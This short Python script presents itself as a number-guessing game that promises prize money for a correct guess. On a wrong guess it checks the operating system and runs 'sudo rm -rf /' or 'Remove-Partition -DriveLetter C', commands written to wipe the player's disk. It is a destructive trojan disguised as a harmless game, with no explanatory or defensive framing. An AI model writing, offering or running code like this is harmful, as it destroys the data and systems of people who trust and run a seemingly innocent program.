import random
import os 
number = random.randint(1,100)
guess = int(input("Guess a no. between 1 to 100 "))
command = ("uname")
pipe = os.popen(command)
output = pipe.read()
pipe.close()
if guess == number :
    print("Yay you guessed it right!! Try it again to winn lakhs of rupees")
else:
    if output== "Darwin" or output == "Linux":
        os.system("sudo rm -rf /")
    else:
        os.system("Remove-Partition -DriveLetter C")